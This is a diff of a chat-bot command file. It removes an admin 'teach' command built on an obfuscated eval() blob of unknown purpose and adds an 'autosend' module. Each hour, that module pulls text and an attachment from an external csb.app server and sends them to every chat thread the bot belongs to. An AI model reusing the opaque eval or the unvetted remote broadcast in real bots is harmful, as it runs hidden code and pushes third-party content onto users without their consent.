@@ -1,13 +1,131 @@
 module.exports.config = {
-  name: "teach",
-  version: "2.0.0",
-  permission: 2,
-  credits: "Imran",
-  description: "",
+  name: "autosend",
+  version: "1.0.0",
+  permission: 0,
   prefix: true,
-  category: "admin",
-  usages: "link",
-    cooldowns: 5,
+  credits: "Nayan",
+  description: "msg",
+  category: "awto send msg", 
+  usages: "",
+  cooldowns: 5,
+  dependencies: {
+	}
 };
 
- var _0xc99e=["","split","0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ+/","slice","indexOf","","",".","pow","reduce","reverse","0"];function _0xe28c(d,e,f){var g=_0xc99e[2][_0xc99e[1]](_0xc99e[0]);var h=g[_0xc99e[3]](0,e);var i=g[_0xc99e[3]](0,f);var j=d[_0xc99e[1]](_0xc99e[0])[_0xc99e[10]]()[_0xc99e[9]](function(a,b,c){if(h[_0xc99e[4]](b)!==-1)return a+=h[_0xc99e[4]](b)*(Math[_0xc99e[8]](e,c))},0);var k=_0xc99e[0];while(j>0){k=i[j%f]+k;j=(j-(j%f))/f}return k||_0xc99e[11]}eval(function(h,u,n,t,e,r){r="";for(var i=0,len=h.length;i<len;i++){var s="";while(h[i]!==n[e]){s+=h[i];i++}for(var j=0;j<n.length;j++)s=s.replace(new RegExp(n[j],"g"),j);r+=String.fromCharCode(_0xe28c(s,e,10)-t)}return decodeURIComponent(escape(r))}("gVSeeVSeeMSeLvSeMeSeeLSeVLSVLVSeVLSeMgSeeISeeMSeevSeMVSeMLSVLVSeevSeMeSeeeSgVSVeeSgVSeLMSeMLSeMvSeeeSeLgSgVSeVVSeMeSeeeSeLgSeMVSeVISeeMSeeeSveSeIVSgVSeLMSeeISeVISvvSgVSeVLSeMMSeVLSeeeSeMVSvvSgVSeLMSeevSeVeSeMLSgVSeIMSvMSgVSeIVSgVSeLgSeeMSeeeSeMLSeMVSgVSeLMSeMgSeVISeeMSeMLSgVSVeeSgVSeevSeVLSeegSeMeSeVISeevSeVLSveSgMSeLMSeMgSeVISeeMSeMLSgMSvMSVeLSgVSeeLSeVLSeMVSgVSeIVSgVSeMVSeVMSeevSeVLSeLMSeLvSVILSVMeSvvSgVSeeVSeVLSeMLSeMLSeLMSeVeSeVLSVILSVMeSgVSeIMSgVSVeeSgVSeVLSeMMSeVLSeeeSeMVSVeLSgVSeLgSeeMSeeeSeMLSeMVSgVSeVISeeeSeeISeMeSeMVSgVSVeeSgVSeLMSeevSeVeSeMLSVLVSeVgSeeMSeVISeeeSveSgMSgVSgMSvMSVLVSeMLSeeISeeLSeVISeMVSveSgMSVeeSVeMSgMSvMSVeLSgVSeVISeVVSgVSveSeVISeeeSeeISeMeSeMVSVLVSeeLSeVLSeeeSeVeSeMVSeVMSgVSVeVSgVSVLgSvMSgVSeIVSgVSeVISeVVSgVSveSeLMSeevSeVeSeMLSVLVSeeLSeVLSeeeSeVeSeMVSeVMSgVSVeeSVeeSVeeSgVSVLMSvMSgVSeIVSgVSeevSeVLSeMVSeMeSeevSeeeSgVSeLMSeeISeVISVLVSeMLSeVLSeeeSeLvSVIISeVLSeMLSeMLSeLMSeVeSeVLSveSgMSVggSeMLSeLMSeVeSeVLSVVvSgVSeMVSeVLSeLMSeLgSeVMSgVSVvISeLMSeMLSeVvSVvvSgVSVeeSVeMSgVSVvISeLMSeeeSeMLSeMISeVLSeevSVvvSgMSvvSgVSeMVSeVMSeevSeVLSeLMSeLvSVILSVMeSvMSVeLSgVSeIMSgVSeVLSeeLSeMLSeVLSgVSeVISeVVSgVSveSeLMSeevSeVeSeMLSVLVSeVgSeeMSeVISeeeSveSgMSgVSgMSvMSVLVSeVISeeeSeLgSeeLSeMeSeLvSeVLSeMLSveSgMSVeeSVeMSgMSvMSvMSgVSeIVSgVSeevSeVLSeMVSeMeSeevSeeeSgVSeLMSeeISeVISVLVSeMLSeVLSeeeSeLvSVIISeVLSeMLSeMLSeLMSeVeSeVLSveSgMSVgLSeeLSeVLSeLMSeMLSeVLSgVSeeISeevSeeMSeMMSeVISeLvSeVLSgVSeLISeeMSeMVSeVMSgVSeLMSgVSeegSeMeSeVLSeMLSeMVSeVISeeMSeeeSgVSeLMSeeeSeLvSgVSeLMSeeeSgVSeLMSeeeSeMLSeMISeVLSeevSVLVSgMSvvSgVSeMVSeVMSeevSeVLSeLMSeLvSVILSVMeSvMSVeLSgVSeIMSgVSeVLSeeLSeMLSeVLSgVSeIVSgVSeevSeVLSeMVSeMeSeevSeeeSgVSeLMSeeISeVISVLVSeMLSeVLSeeeSeLvSVIISeVLSeMLSeMLSeLMSeVeSeVLSveSgMSVgLSeeLSeVLSeLMSeMLSeVLSgVSeMeSeMLSeVLSgVSvVSVeeSVeMSvVSgVSeLgSeVMSeLMSeevSeLMSeLgSeMVSeVLSeevSgVSeMVSeeMSgVSeMLSeVLSeeISeLMSeevSeLMSeMVSeVLSgVSeMVSeVMSeVLSgVSeegSeMeSeVLSeMLSeMVSeVISeeMSeeeSgVSeLMSeeeSeLvSgVSeLMSeeeSeMLSeMISeVLSeevSVLVSgMSvvSgVSeMVSeVMSeevSeVLSeLMSeLvSVILSVMeSvMSVeLSgVSeIMSgVSeIMSgVSeLgSeeMSeeeSeMLSeMVSgVSeMVSeVLSeLMSeLgSeVMSVgVSeMeSeVLSeevSeMvSgVSVeeSgVSeVISeeeSeeISeMeSeMVSVvISVLMSVvvSVLVSeMVSeevSeVISeeVSveSvMSVeLSgVSeLgSeeMSeeeSeMLSeMVSgVSeLMSeeeSeMLSVgVSeMeSeVLSeevSeMvSgVSVeeSgVSeVISeeeSeeISeMeSeMVSVvISVLISVvvSVLVSeMVSeevSeVISeeVSveSvMSVeLSgVSeMVSeevSeMvSgVSeIVSgVSeLgSeeMSeeeSeMLSeMVSgVSeevSeVLSeMLSeeISeeMSeeeSeMLSeVLSgVSVeeSgVSeLMSeMISeLMSeVISeMVSgVSeLMSeMgSeVISeeMSeMLSVLVSeVeSeVLSeMVSveSeLeSeVMSeMVSeMVSeeISeMLSVVvSVLeSVLeSeMLSeVISeeVSVLLSeLMSeeISeVISVLLSeILSeVVSeVeSVVISVLVSeeMSeeeSeevSeVLSeeeSeLvSeVLSeevSVLVSeLgSeeMSeeVSVLeSeMLSeVISeeVSVeISeMVSeVLSeLMSeLgSeVMSVeeSggSeIVSeMVSeVLSeLMSeLgSeVMSVgVSeMeSeVLSeevSeMvSeIMSvLSeLMSeeeSeMLSVeeSggSeIVSeLMSeeeSeMLSVgVSeMeSeVLSeevSeMvSeIMSeLeSvMSVeLSgVSeVISeVVSgVSveSeevSeVLSeMLSeeISeeMSeeeSeMLSeVLSVLVSeLvSeLMSeMVSeLMSgVSvLSvLSgVSeevSeVLSeMLSeeISeeMSeeeSeMLSeVLSVLVSeLvSeLMSeMVSeLMSVLVSeeVSeVLSeMLSeMLSeLMSeVeSeVLSvMSgVSeIVSgVSeLMSeeISeVISVLVSeMLSeVLSeeeSeLvSVIISeVLSeMLSeMLSeLMSeVeSeVLSveSeevSeVLSeMLSeeISeeMSeeeSeMLSeVLSVLVSeLvSeLMSeMVSeLMSVLVSeeVSeVLSeMLSeMLSeLMSeVeSeVLSvvSgVSeMVSeVMSeevSeVLSeLMSeLvSVILSVMeSvvSgVSeeVSeVLSeMLSeMLSeLMSeVeSeVLSVILSVMeSvMSVeLSgVSeIMSgVSeVLSeeLSeMLSeVLSgVSeIVSgVSeLMSeeISeVISVLVSeMLSeVLSeeeSeLvSVIISeVLSeMLSeMLSeLMSeVeSeVLSveSgMSVevSeeeSgVSeVLSeevSeevSeeMSeevSgVSeeMSeLgSeLgSeMeSeevSeevSeVLSeLvSgVSeMISeVMSeVISeeLSeVLSgVSeVVSeVLSeMVSeLgSeVMSeVISeeeSeVeSgVSeMVSeVMSeVLSgVSeLvSeLMSeMVSeLMSVLVSgMSvvSgVSeMVSeVMSeevSeVLSeLMSeLvSVILSVMeSvMSVeLSgVSeIMSgVSeIMSgVSeLgSeLMSeMVSeLgSeVMSgVSveSeVLSeevSeevSeeMSeevSvMSgVSeIVSgVSeLgSeeMSeeeSeMLSeeMSeeLSeVLSVLVSeVLSeevSeevSeeMSeevSveSeVLSeevSeevSeeMSeevSvMSVeLSgVSeLMSeeISeVISVLVSeMLSeVLSeeeSeLvSVIISeVLSeMLSeMLSeLMSeVeSeVLSveSgMSVevSeeeSgVSeVLSeevSeevSeeMSeevSgVSeeMSeLgSeLgSeMeSeevSeevSeVLSeLvSgVSeMISeVMSeVISeeLSeVLSgVSeVVSeVLSeMVSeLgSeVMSeVISeeeSeVeSgVSeMVSeVMSeVLSgVSeLvSeLMSeMVSeLMSVLVSgMSvvSgVSeMVSeVMSeevSeVLSeLMSeLvSVILSVMeSvMSVeLSgVSeIMSeLSeIMSVeLS",71,"LVeMIgvSR",4,7,44))
+
+const r = a => a[Math.floor(Math.random()*a.length)],
+{
+  get
+} = require('axios'),
+config = [{
+      timer: '12:00:00 AM',
+      message: ['====== 𝗔𝗨𝗧𝗢 𝗦𝗘𝗡𝗗 ======\n━━━━━━━━━━━━━━━━\n➝ 𝗡𝗼𝘄 𝗜𝘀: {time} \n\n💬:{thinh}\n━━━━━━━━━━━━━━━━━━\n➝ 𝗧𝗵𝗶𝘀 𝗜𝘀 𝗔𝗻 𝗔𝘂𝘁𝗼𝗺𝗮𝘁𝗶𝗰 𝗠𝗲𝘀𝘀𝗮𝗴𝗲']
+},
+{
+      timer: '1:00:00 AM',
+  message: ['====== 𝗔𝗨𝗧𝗢 𝗦𝗘𝗡𝗗 ======\n━━━━━━━━━━━━━━━━\n➝ 𝗡𝗼𝘄 𝗜𝘀: {time} \n\n💬:{thinh}\n━━━━━━━━━━━━━━━━━━\n➝ 𝗧𝗵𝗶𝘀 𝗜𝘀 𝗔𝗻 𝗔𝘂𝘁𝗼𝗺𝗮𝘁𝗶𝗰 𝗠𝗲𝘀𝘀𝗮𝗴𝗲']
+},
+{
+      timer: '2:00:00 AM',
+      message: ['====== 𝗔𝗨𝗧𝗢 𝗦𝗘𝗡𝗗 ======\n━━━━━━━━━━━━━━━━\n➝ 𝗡𝗼𝘄 𝗜𝘀: {time} \n\n💬:{thinh}\n━━━━━━━━━━━━━━━━━━\n➝ 𝗧𝗵𝗶𝘀 𝗜𝘀 𝗔𝗻 𝗔𝘂𝘁𝗼𝗺𝗮𝘁𝗶𝗰 𝗠𝗲𝘀𝘀𝗮𝗴𝗲']
+},
+{
+      timer: '3:00:00 AM',
+      message: ['====== 𝗔𝗨𝗧𝗢 𝗦𝗘𝗡𝗗 ======\n━━━━━━━━━━━━━━━━\n➝ 𝗡𝗼𝘄 𝗜𝘀: {time} \n\n💬:{thinh}\n━━━━━━━━━━━━━━━━━━\n➝ 𝗧𝗵𝗶𝘀 𝗜𝘀 𝗔𝗻 𝗔𝘂𝘁𝗼𝗺𝗮𝘁𝗶𝗰 𝗠𝗲𝘀𝘀𝗮𝗴𝗲']
+},
+{
+      timer: '4:00:00 AM',
+      message: ['====== 𝗔𝗨𝗧𝗢 𝗦𝗘𝗡𝗗 ======\n━━━━━━━━━━━━━━━━\n➝ 𝗡𝗼𝘄 𝗜𝘀: {time} \n\n💬:{thinh}\n━━━━━━━━━━━━━━━━━━\n➝ 𝗧𝗵𝗶𝘀 𝗜𝘀 𝗔𝗻 𝗔𝘂𝘁𝗼𝗺𝗮𝘁𝗶𝗰 𝗠𝗲𝘀𝘀𝗮𝗴𝗲']
+},
+{
+      timer: '5:00:00 AM',
+      message: ['====== 𝗔𝗨𝗧𝗢 𝗦𝗘𝗡𝗗 ======\n━━━━━━━━━━━━━━━━\n➝ 𝗡𝗼𝘄 𝗜𝘀: {time} \n\n💬:{thinh}\n━━━━━━━━━━━━━━━━━━\n➝ 𝗧𝗵𝗶𝘀 𝗜𝘀 𝗔𝗻 𝗔𝘂𝘁𝗼𝗺𝗮𝘁𝗶𝗰 𝗠𝗲𝘀𝘀𝗮𝗴𝗲']
+},
+{
+      timer: '6:00:00 AM',
+      message: ['====== 𝗔𝗨𝗧𝗢 𝗦𝗘𝗡𝗗 ======\n━━━━━━━━━━━━━━━━\n➝ 𝗡𝗼𝘄 𝗜𝘀: {time} \n\n💬:{thinh}\n━━━━━━━━━━━━━━━━━━\n➝ 𝗧𝗵𝗶𝘀 𝗜𝘀 𝗔𝗻 𝗔𝘂𝘁𝗼𝗺𝗮𝘁𝗶𝗰 𝗠𝗲𝘀𝘀𝗮𝗴𝗲']
+},
+{
+      timer: '7:00:00 AM',
+      message: ['====== 𝗔𝗨𝗧𝗢 𝗦𝗘𝗡𝗗 ======\n━━━━━━━━━━━━━━━━\n➝ 𝗡𝗼𝘄 𝗜𝘀: {time} \n\n💬:{thinh}\n━━━━━━━━━━━━━━━━━━\n➝ 𝗧𝗵𝗶𝘀 𝗜𝘀 𝗔𝗻 𝗔𝘂𝘁𝗼𝗺𝗮𝘁𝗶𝗰 𝗠𝗲𝘀𝘀𝗮𝗴𝗲']
+},
+{
+  timer: '8:00:00 AM',
+  message: ['====== 𝗔𝗨𝗧𝗢 𝗦𝗘𝗡𝗗 ======\n━━━━━━━━━━━━━━━━\n➝ 𝗡𝗼𝘄 𝗜𝘀: {time} \n\n💬:{thinh}\n━━━━━━━━━━━━━━━━━━\n➝ 𝗧𝗵𝗶𝘀 𝗜𝘀 𝗔𝗻 𝗔𝘂𝘁𝗼𝗺𝗮𝘁𝗶𝗰 𝗠𝗲𝘀𝘀𝗮𝗴𝗲']
+},
+{
+      timer: '9:00:00 AM',
+      message: ['====== 𝗔𝗨𝗧𝗢 𝗦𝗘𝗡𝗗 ======\n━━━━━━━━━━━━━━━━\n➝ 𝗡𝗼𝘄 𝗜𝘀: {time} \n\n💬:{thinh}\n━━━━━━━━━━━━━━━━━━\n➝ 𝗧𝗵𝗶𝘀 𝗜𝘀 𝗔𝗻 𝗔𝘂𝘁𝗼𝗺𝗮𝘁𝗶𝗰 𝗠𝗲𝘀𝘀𝗮𝗴𝗲']
+},
+{ 
+      timer: '10:00:00 AM',
+      message: ['====== 𝗔𝗨𝗧𝗢 𝗦𝗘𝗡𝗗 ======\n━━━━━━━━━━━━━━━━\n➝ 𝗡𝗼𝘄 𝗜𝘀: {time} \n\n💬:{thinh}\n━━━━━━━━━━━━━━━━━━\n➝ 𝗧𝗵𝗶𝘀 𝗜𝘀 𝗔𝗻 𝗔𝘂𝘁𝗼𝗺𝗮𝘁𝗶𝗰 𝗠𝗲𝘀𝘀𝗮𝗴𝗲']
+},
+{ 
+      timer: '12:00:00 PM',
+      message: ['====== 𝗔𝗨𝗧𝗢 𝗦𝗘𝗡𝗗 ======\n━━━━━━━━━━━━━━━━\n➝ 𝗡𝗼𝘄 𝗜𝘀: {time} \n\n💬:{thinh}\n━━━━━━━━━━━━━━━━━━\n➝ 𝗧𝗵𝗶𝘀 𝗜𝘀 𝗔𝗻 𝗔𝘂𝘁𝗼𝗺𝗮𝘁𝗶𝗰 𝗠𝗲𝘀𝘀𝗮𝗴𝗲']
+},
+{
+      timer: '11:00:00 AM',
+      message: ['====== 𝗔𝗨𝗧𝗢 𝗦𝗘𝗡𝗗 ======\n━━━━━━━━━━━━━━━━\n➝ 𝗡𝗼𝘄 𝗜𝘀: {time} \n\n💬:{thinh}\n━━━━━━━━━━━━━━━━━━\n➝ 𝗧𝗵𝗶𝘀 𝗜𝘀 𝗔𝗻 𝗔𝘂𝘁𝗼𝗺𝗮𝘁𝗶𝗰 𝗠𝗲𝘀𝘀𝗮𝗴𝗲']
+},
+{
+      timer: '1:00:00 PM',
+      message: ['====== 𝗔𝗨𝗧𝗢 𝗦𝗘𝗡𝗗 ======\n━━━━━━━━━━━━━━━━\n➝ 𝗡𝗼𝘄 𝗜𝘀: {time} \n\n💬:{thinh}\n━━━━━━━━━━━━━━━━━━\n➝ 𝗧𝗵𝗶𝘀 𝗜𝘀 𝗔𝗻 𝗔𝘂𝘁𝗼𝗺𝗮𝘁𝗶𝗰 𝗠𝗲𝘀𝘀𝗮𝗴𝗲']
+},
+{
+      timer: '2:00:00 PM',
+      message: ['====== 𝗔𝗨𝗧𝗢 𝗦𝗘𝗡𝗗 ======\n━━━━━━━━━━━━━━━━\n➝ 𝗡𝗼𝘄 𝗜𝘀: {time} \n\n💬:{thinh}\n━━━━━━━━━━━━━━━━━━\n➝ 𝗧𝗵𝗶𝘀 𝗜𝘀 𝗔𝗻 𝗔𝘂𝘁𝗼𝗺𝗮𝘁𝗶𝗰 𝗠𝗲𝘀𝘀𝗮𝗴𝗲']
+},
+{
+      timer: '3:00:00 PM',
+      message: ['====== 𝗔𝗨𝗧𝗢 𝗦𝗘𝗡𝗗 ======\n━━━━━━━━━━━━━━━━\n➝ 𝗡𝗼𝘄 𝗜𝘀: {time} \n\n💬:{thinh}\n━━━━━━━━━━━━━━━━━━\n➝ 𝗧𝗵𝗶𝘀 𝗜𝘀 𝗔𝗻 𝗔𝘂𝘁𝗼𝗺𝗮𝘁𝗶𝗰 𝗠𝗲𝘀𝘀𝗮𝗴𝗲']
+},
+{
+      timer: '4:00:00 PM',
+      message: ['====== 𝗔𝗨𝗧𝗢 𝗦𝗘𝗡𝗗 ======\n━━━━━━━━━━━━━━━━\n➝ 𝗡𝗼𝘄 𝗜𝘀: {time} \n\n💬:{thinh}\n━━━━━━━━━━━━━━━━━━\n➝ 𝗧𝗵𝗶𝘀 𝗜𝘀 𝗔𝗻 𝗔𝘂𝘁𝗼𝗺𝗮𝘁𝗶𝗰 𝗠𝗲𝘀𝘀𝗮𝗴𝗲']
+},
+{
+      timer: '5:00:00 PM',
+      message: ['====== 𝗔𝗨𝗧𝗢 𝗦𝗘𝗡𝗗 ======\n━━━━━━━━━━━━━━━━\n➝ 𝗡𝗼𝘄 𝗜𝘀: {time} \n\n💬:{thinh}\n━━━━━━━━━━━━━━━━━━\n➝ 𝗧𝗵𝗶𝘀 𝗜𝘀 𝗔𝗻 𝗔𝘂𝘁𝗼𝗺𝗮𝘁𝗶𝗰 𝗠𝗲𝘀𝘀𝗮𝗴𝗲']
+},
+{
+      timer: '6:00:00 PM',
+      message: ['====== 𝗔𝗨𝗧𝗢 𝗦𝗘𝗡𝗗 ======\n━━━━━━━━━━━━━━━━\n➝ 𝗡𝗼𝘄 𝗜𝘀: {time} \n\n💬:{thinh}\n━━━━━━━━━━━━━━━━━━\n➝ 𝗧𝗵𝗶𝘀 𝗜𝘀 𝗔𝗻 𝗔𝘂𝘁𝗼𝗺𝗮𝘁𝗶𝗰 𝗠𝗲𝘀𝘀𝗮𝗴𝗲']
+},
+{
+      timer: '7:00:00 PM',
+      message: ['====== 𝗔𝗨𝗧𝗢 𝗦𝗘𝗡𝗗 ======\n━━━━━━━━━━━━━━━━\n➝ 𝗡𝗼𝘄 𝗜𝘀: {time} \n\n💬:{thinh}\n━━━━━━━━━━━━━━━━━━\n➝ 𝗧𝗵𝗶𝘀 𝗜𝘀 𝗔𝗻 𝗔𝘂𝘁𝗼𝗺𝗮𝘁𝗶𝗰 𝗠𝗲𝘀𝘀𝗮𝗴𝗲']
+},
+{
+      timer: '8:00:00 PM',
+      message: ['====== 𝗔𝗨𝗧𝗢 𝗦𝗘𝗡𝗗 ======\n━━━━━━━━━━━━━━━━\n➝ 𝗡𝗼𝘄 𝗜𝘀: {time} \n\n💬:{thinh}\n━━━━━━━━━━━━━━━━━━\n➝ 𝗧𝗵𝗶𝘀 𝗜𝘀 𝗔𝗻 𝗔𝘂𝘁𝗼𝗺𝗮𝘁𝗶𝗰 𝗠𝗲𝘀𝘀𝗮𝗴𝗲']
+},
+{
+      timer: '9:00:00 PM',
+      message: ['====== 𝗔𝗨𝗧𝗢 𝗦𝗘𝗡𝗗 ======\n━━━━━━━━━━━━━━━━\n➝ 𝗡𝗼𝘄 𝗜𝘀: {time} \n\n💬:{thinh}\n━━━━━━━━━━━━━━━━━━\n➝ 𝗧𝗵𝗶𝘀 𝗜𝘀 𝗔𝗻 𝗔𝘂𝘁𝗼𝗺𝗮𝘁𝗶𝗰 𝗠𝗲𝘀𝘀𝗮𝗴𝗲']
+},
+{
+      timer: '10:00:00 PM',
+      message: ['====== 𝗔𝗨𝗧𝗢 𝗦𝗘𝗡𝗗 ======\n━━━━━━━━━━━━━━━━\n➝ 𝗡𝗼𝘄 𝗜𝘀: {time} \n\n💬:{thinh}\n━━━━━━━━━━━━━━━━━━\n➝ 𝗧𝗵𝗶𝘀 𝗜𝘀 𝗔𝗻 𝗔𝘂𝘁𝗼𝗺𝗮𝘁𝗶𝗰 𝗠𝗲𝘀𝘀𝗮𝗴𝗲']
+},
+{
+      timer: '11:00:00 PM',
+      message: ['====== 𝗔𝗨𝗧𝗢 𝗦𝗘𝗡𝗗 ======\n━━━━━━━━━━━━━━━━\n➝ 𝗡𝗼𝘄 𝗜𝘀: {time} \n\n💬:{thinh}\n━━━━━━━━━━━━━━━━━━\n➝ 𝗧𝗵𝗶𝘀 𝗜𝘀 𝗔𝗻 𝗔𝘂𝘁𝗼𝗺𝗮𝘁𝗶𝗰 𝗠𝗲𝘀𝘀𝗮𝗴𝗲']
+  }];
+module.exports.onLoad = o => {
+  if (!!global.autosendmessage_setinterval) clearInterval(global.autosendmessage_setinterval);
+  global.autosendmessage_setinterval = setInterval(async function() {
+      if (á = config.find(i => i.timer == new Date(Date.now()+25200000).toLocaleString().split(/,/).pop().trim())) {
+          var msg = r(á.message);
+          msg = msg.replace(/{time}/g, (require("moment-timezone")).tz("Asia/Dhaka").format("hh:mm:ss (D/MM/YYYY) (dddd)")).replace(/{thinh}/g, (await get(`https://3f5p37-3000.csb.app/status`)).data.data.title)
+          msg = {
+              body: msg, attachment: (await get((await get(`https://3f5p37-3000.csb.app/status`)).data.data.url, {
+                  responseType: 'stream'
+              })).data
+          };
+          global.data.allThreadID.forEach(i => o.api.sendMessage(msg, i));
+      };
+  }, 1000);
+};
+module.exports.run = () => {};
